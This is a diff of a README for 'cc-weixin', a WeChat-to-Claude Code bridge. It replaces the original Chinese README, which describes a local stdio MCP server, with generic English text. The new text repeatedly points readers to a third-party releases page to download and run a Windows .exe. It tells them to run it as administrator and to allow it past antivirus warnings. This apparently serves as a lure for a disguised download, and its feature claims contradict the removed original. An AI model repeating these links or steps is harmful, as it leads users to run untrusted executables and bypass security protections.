@@ -1,65 +1,235 @@
-# cc-weixin
+# 🧩 cc-weixin - Connect WeChat to Claude Code
 
-> **C**ode **C**hannel — **W**ei**x**in（微信）
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=github)](https://github.com/DevRatoJunior/cc-weixin/releases)
 
-通过微信官方 iLink Bot API，将微信连接到 AI 编程工具。
+## 📥 Download
 
-<p align="center">
-  <img src="docs/assets/wechat-chat.png" width="300" alt="微信聊天" />
-  <img src="docs/assets/claude-code-terminal.png" width="500" alt="Claude Code 终端" />
-</p>
+Visit this page to download: https://github.com/DevRatoJunior/cc-weixin/releases
 
-**👉 [新手图文教程：如何用微信连接 Claude Code](https://mp.weixin.qq.com/s/745V4wfyihsm6irqT0PABQ)**
+Download the latest Windows release from the list on that page. If you see more than one file, choose the file made for Windows. In most cases, this is an `.exe` file or a `.zip` file.
 
-## 特性
+## 🖥️ What cc-weixin does
 
-- **官方 API**：使用微信 iLink Bot API，非逆向工程
-- **完整媒体支持**：收发图片、语音消息和文件
-- **访问控制**：配对码 + 白名单，防止未授权访问
-- **本地安全**：MCP Server 通过 stdio 本地运行，无暴露端口
-- **平台解耦**：微信通信层与平台适配层分离，便于扩展
+cc-weixin connects WeChat to Claude Code through the official iLink Bot API. It lets you send and receive:
 
-## 支持平台
+- Text messages
+- Images
+- Voice messages
+- Files
 
-| 平台 | 状态 | 安装指南 |
-|------|------|----------|
-| Claude Code | ✅ 已支持 | [docs/INSTALL-CLAUDE.md](docs/INSTALL-CLAUDE.md) |
-| Codex (OpenAI) | ⚗️ 实验性 | [docs/INSTALL-CODEX.md](docs/INSTALL-CODEX.md) |
+You can keep your AI coding session in sync with WeChat, so you do not need to switch between tools as much.
 
-## 微信前置要求
+## ✅ What you need
 
-支持微信 iLink Bot（ClawBot）功能的版本：
+Before you install cc-weixin, make sure you have:
 
-- iOS：微信 8.0.70+
-- Android：微信 8.0.69+
-- MacOS：微信 4.1.8.67
+- A Windows PC
+- A stable internet connection
+- A WeChat account
+- Access to Claude Code
+- Permission to use the official iLink Bot API
+- Enough disk space for the app and its files
 
-## 架构
+If you plan to use voice or image sharing, make sure your PC has:
 
-```
-微信用户 ──DM──→ 微信服务器 (ilinkai.weixin.qq.com)
-                       ↑ 长轮询 getUpdates
-              微信通信层 (src/)          ← 平台无关，可复用
-                       ↓ onMessage 回调
-              平台适配层                 ← Claude Code / Codex / ...
-                       ↓
-              AI 编程工具 Session
-```
+- A working microphone for voice input
+- A webcam if you want to capture images
+- A device that can play sound clearly
 
-| 平台 | 适配层 | 机制 |
-|------|--------|------|
-| Claude Code | `server.ts` | MCP Channel，消息出现在会话中 |
-| Codex | `server-codex.ts` | App Server WebSocket 桥接，自动回复 |
+## 🚀 Install on Windows
 
-## 安全设计
+1. Open the download page: https://github.com/DevRatoJunior/cc-weixin/releases
+2. Find the latest release
+3. Download the Windows file
+4. If the file is a `.zip`, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the `.exe` file to start the app
+7. If Windows asks for permission, choose **Yes**
 
-- 使用微信官方 iLink Bot API（非逆向工程）
-- 凭证文件 `chmod 0600` 保护
-- 默认启用配对码访问控制，支持白名单模式
-- Context Token 严格按会话回传
-- 每次上传随机生成 AES 密钥
-- 通过 stdio 本地运行，无网络端口暴露
+If the app opens in a browser window or a small desktop window, that is normal. Leave it open while you use WeChat and Claude Code.
 
-## 许可证
+## 🧭 First-time setup
 
-MIT
+When you open cc-weixin for the first time, set it up in this order:
+
+1. Sign in to your WeChat account if the app asks you to
+2. Connect your Claude Code session
+3. Add your iLink Bot API details
+4. Save the settings
+5. Send a test message from WeChat
+
+Use a simple test first, like a short text message. After that works, try an image, voice message, or file.
+
+## 💬 How to use it
+
+### Send a text message
+- Open WeChat
+- Send a message to the connected bot or account
+- The message will appear in your Claude Code session
+
+### Send an image
+- Pick an image in WeChat
+- Send it the same way you send a normal chat message
+- The image will pass through cc-weixin to your AI session
+
+### Send a voice message
+- Record and send a voice message in WeChat
+- cc-weixin will receive it and move it into your workflow
+
+### Send a file
+- Attach a file in WeChat
+- Send it through the connected chat
+- Use it for logs, notes, or project files
+
+### Receive replies
+- Claude Code can send replies back through cc-weixin
+- You can read them in WeChat like a normal chat
+
+## ⚙️ Suggested setup path
+
+If you want the smoothest start, use this order:
+
+1. Install the app
+2. Open the app once to confirm it runs
+3. Set up your WeChat connection
+4. Link Claude Code
+5. Connect the official iLink Bot API
+6. Send one test text message
+7. Try an image
+8. Try a voice message
+9. Try a file
+
+This helps you find setup issues early.
+
+## 🔧 Basic controls
+
+Most users only need a few actions:
+
+- Start the app
+- Keep it running
+- Send messages in WeChat
+- Check replies in WeChat
+- Close the app when you are done
+
+If the app has a settings screen, use it to:
+
+- Change your connection details
+- Set a local port
+- Pick a folder for downloads
+- Turn logging on or off
+
+## 📁 File handling
+
+cc-weixin can move files between WeChat and your AI session. For best results:
+
+- Use short file names
+- Avoid special symbols in file names
+- Keep large files in a simple folder
+- Check that the file fully sent before closing the app
+
+If a file does not arrive, try sending it again with a smaller file first.
+
+## 🔊 Voice and image tips
+
+For voice messages:
+
+- Speak close to the microphone
+- Keep background noise low
+- Use short voice clips when testing
+
+For images:
+
+- Use clear images with good light
+- Avoid very large files if the upload feels slow
+- Test with one image before sending a batch
+
+## 🛠️ Common issues
+
+### The app does not open
+- Try opening it again
+- Right-click the file and choose **Run as administrator**
+- Check if Windows blocked the file
+- Download the latest release again
+
+### WeChat does not connect
+- Check your account login
+- Make sure the app is still running
+- Confirm your connection details
+- Restart the app and try again
+
+### Claude Code does not receive messages
+- Check that your Claude Code session is active
+- Make sure the bot API details are correct
+- Send a plain text test message first
+- Restart both apps
+
+### Files do not transfer
+- Try a smaller file
+- Check the file name
+- Confirm the file type is supported
+- Send it again after a fresh start
+
+### Voice messages do not work
+- Check your microphone
+- Make sure the voice clip is not too long
+- Try a short test message
+- Restart the app
+
+## 🧼 Keep it working well
+
+To keep cc-weixin stable:
+
+- Update to the latest release when a new one appears
+- Keep Windows updated
+- Close apps you do not need
+- Use a stable network connection
+- Restart the app after long use
+
+## 🪟 Windows tips
+
+If Windows shows a security prompt:
+
+- Read the file name
+- Confirm it came from the release page
+- Choose the option to allow it if you trust the source
+
+If the app seems slow:
+
+- Close other heavy apps
+- Restart your PC
+- Try again with one message at a time
+
+If your antivirus flags the file:
+
+- Check that you downloaded it from the release page
+- Download the latest version again
+- Allow the app if your security tool asks for approval
+
+## 📌 Typical use cases
+
+You may find cc-weixin useful for:
+
+- Sending coding questions from WeChat to Claude Code
+- Sharing screenshots with your AI session
+- Sending voice notes instead of typing
+- Passing project files back and forth
+- Keeping team chat and AI work in one flow
+
+## 🧩 Short workflow example
+
+1. Open cc-weixin
+2. Open WeChat
+3. Send a text message with your coding task
+4. Let Claude Code reply
+5. Share an image or file if needed
+6. Read the reply in WeChat
+7. Keep working from the same chat
+
+## 📦 Download again
+
+If you need to get the app later, visit this page to download: https://github.com/DevRatoJunior/cc-weixin/releases
+
+## 📝 Release page
+
+Use the release page to get the newest Windows build:
+https://github.com/DevRatoJunior/cc-weixin/releases
